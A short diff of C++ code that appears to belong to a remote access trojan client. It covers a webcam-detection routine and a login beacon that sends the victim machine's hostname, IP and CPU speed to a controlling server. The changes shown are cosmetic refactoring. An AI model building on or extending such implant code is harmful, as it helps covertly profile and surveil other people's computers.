@@ -33,7 +33,7 @@ DWORD CPUClockMhz()
 	return	dwCPUMhz;
 }
 
-bool IsWebCam()
+inline bool IsWebCam()
 {
 	bool bRet = false;
 	HINSTANCE avicap32 = LoadLibraryW(L"avicap32.dll");
@@ -56,8 +56,6 @@ bool IsWebCam()
 
 int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
 {
-	int nRet = SOCKET_ERROR;
-
 	LOGININFO LoginInfo;
 	// 开始构造数据
 	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
@@ -73,7 +71,7 @@ int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
 	int nwlen = MultiByteToWideChar(CP_ACP, 0, hostn, lstrlenA(hostn), NULL, 0);
 	MultiByteToWideChar(CP_ACP, 0, hostn, lstrlenA(hostn), hostname, nwlen);
 #else
-	gethostname(hostname,128);
+	gethostname(hostname, 128);
 #endif
 
 	// 连接的IP地址
@@ -92,7 +90,7 @@ int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
 	// Speed
 	LoginInfo.dwSpeed = dwSpeed;
 
-	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
+	int nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
 
 	return nRet;
 }
